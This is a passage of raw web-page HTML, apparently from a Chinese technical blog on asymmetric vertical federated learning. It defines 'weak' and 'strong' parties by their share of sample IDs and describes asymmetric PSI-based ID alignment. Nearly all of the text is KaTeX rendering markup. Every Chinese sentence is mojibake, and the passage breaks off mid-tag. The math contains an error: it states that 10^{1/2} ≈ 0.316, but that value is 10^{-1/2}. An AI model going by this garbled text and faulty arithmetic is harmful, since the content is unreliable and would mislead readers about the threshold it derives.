class="mtight">âˆ£</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.214em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">âˆ’</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0352em;"></span><span class="mord"><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0352em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.214em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">âˆ’</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.3052em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p>å¦‚æœä¸Šé¢çš„æ¡ä»¶æˆç«‹ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯ç§°ä¸º<code>å¼±æ–¹</code>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ç§°ä¸º<code>å¼ºæ–¹</code>ã€‚<br>åˆ†æï¼šç”±ä¸Šé¢çš„æ¡ä»¶å¯ä»¥å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow></mfrac><mo>&lt;</mo><mn>1</mn><msup><mn>0</mn><mfrac><mn>1</mn><mn>2</mn></mfrac></msup><mo>â‰ˆ</mo><mn>0.316</mn></mrow><annotation encoding="application/x-tex">\frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|}&lt;10^{\frac{1}{2}}\approx 0.316</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.5552em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0352em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.214em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.954em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0.316</span></span></span></span>ï¼Œå³æ ·æœ¬æ•°é‡å æ¯”ä½äº0.316çš„ä¸ºå¼±æ–¹ã€‚</p><p>ä»¥ä¸Šçš„åˆ†æéƒ½æ˜¯ä¸¤æ–¹çš„ï¼Œäº‹å®ä¸Šï¼Œé€šè¿‡éå¯¹ç§°ä¿æŠ¤å¼±æ–¹çš„æ ·æœ¬IDéšç§ï¼Œå¯ä»¥å°†åˆ†æç®€å•æ‰©å±•åˆ°å¤šæ–¹æ¡ˆä¾‹ã€‚</p></li></ol><h1 id="Asymmetrical-ID-Alignment">Asymmetrical ID Alignment</h1><p>IDå¯¹é½æ˜¯çºµå‘è”é‚¦å­¦ä¹ å·¥ä½œæµçš„ç¬¬ä¸€æ­¥ã€‚æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨æ ‡å‡†PSIåè®®ä»¥å®ç°éå¯¹ç§°IDå¯¹é½ï¼Œå¹¶æä¾›äº†ä¸€ç§ä½¿ç”¨ä¼ ç»Ÿå¯†ç å­¦çš„å®ç°æ–¹æ³•ã€‚</p><h2 id="Asymmetrical-PSI-Protocols">Asymmetrical PSI Protocols</h2><p>åœ¨SVFLçš„æ ·æœ¬å¯¹é½é˜¶æ®µï¼Œæ ‡å‡†PSIåè®®çš„æ‰§è¡Œä¸ä»…è®©å„æ–¹è·å¾—å…±æœ‰æ ·æœ¬çš„çŸ¥è¯†ï¼Œè¿˜æä¾›äº†ä¸€ä¸ªæ ‡ç­¾ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å°†åˆ†å¸ƒå¼æ ·æœ¬ç‰‡æ®µé“¾æ¥åœ¨ä¸€èµ·ï¼Œä¸ºåç»­çš„è”é‚¦å­¦ä¹ é“ºå¹³é“è·¯ã€‚è€Œåœ¨AVFLä¸­ï¼Œä¸ºäº†æ­£ç¡®å®ç°æ ·æœ¬å¯¹é½ï¼Œå¿…é¡»é‡‡å–æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„æ ‡å‡†PSIåè®®ï¼š</p><ol><li>çœŸå®äº¤é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯¹å¼ºå‚ä¸æ–¹ä¿å¯†</li><li>åœ¨è”é‚¦æ¨¡å‹è®­ç»ƒé˜¶æ®µï¼Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯¹åº”çš„åˆ†å¸ƒå¼æ ·æœ¬ä»ç„¶å¯ä»¥å¯¹é½</li></ol><p>ä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>w</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_{w}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9303em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_{s}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9303em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> åˆ†åˆ«è¡¨ç¤ºå¾…IDå¯¹é½çš„å¼±æ–¹å’Œå¼ºæ–¹çš„æ ·æœ¬IDé›†åˆï¼ŒäºŒè€…å®šä¹‰å¦‚ä¸‹ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mi>w</mi><mi>o</mi></msubsup><mo fence="true">}</mo></mrow><mo>=</mo><mi><munder><mo><mi mathvariant="normal">argmin</mi><mo>â¡</mo></mo><mrow><mi mathvariant="script">I</mi><mo>âˆˆ</mo><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">}</mo></mrow></mrow></munder></mi><mi mathvariant="normal">âˆ£</mi><mi mathvariant="script">I</mi><mi mathvariant="normal">âˆ£</mi><mo separator="true">,</mo><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup><mo fence="true">}</mo></mrow><mo>=</mo><mi><munder><mo><mi mathvariant="normal">argmax</mi><mo>â¡</mo></mo><mrow><mi mathvariant="script">I</mi><mo>âˆˆ</mo><mrow><mo fence="true">{</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">}</mo></mrow></mrow></munder></mi><mi mathvariant="normal">âˆ£</mi><mi mathvariant="script">I</mi><mi mathvariant="normal">âˆ£</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\left\{\mathcal{I}_{w}^{o}\right\}=\underset{\mathcal{I} \in\left\{\mathcal{I}_{1}^{o}, \mathcal{I}_{2}^{o}\right\}}{\operatorname{argmin}}|\mathcal{I}|,\left\{\mathcal{I}_{s}^{o}\right\}=\underset{\mathcal{I} \in\left\{\mathcal{I}_{1}^{o}, \mathcal{I}_{2}^{o}\right\}}{\operatorname{argmax}}|\mathcal{I}| .</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.2104em;vertical-align:-1.4604em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-1.9421em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="mrel mtight">âˆˆ</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">{</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">}</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop"><span class="mord mathrm">argmin</span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.4604em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mord">âˆ£</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.2104em;vertical-align:-1.4604em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-1.9421em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="mrel mtight">âˆˆ</span><span class="minner mtight"><span class="mopen sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">{</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6523em;"><span style="top:-2.1885em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3115em;"><span></span></span></span></span></span></span><span class="mclose sizing reset-size3 size6 mtight delimcenter" style="top:0.075em;"><span class="mtight">}</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop"><span class="mord mathrm">argmax</span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" 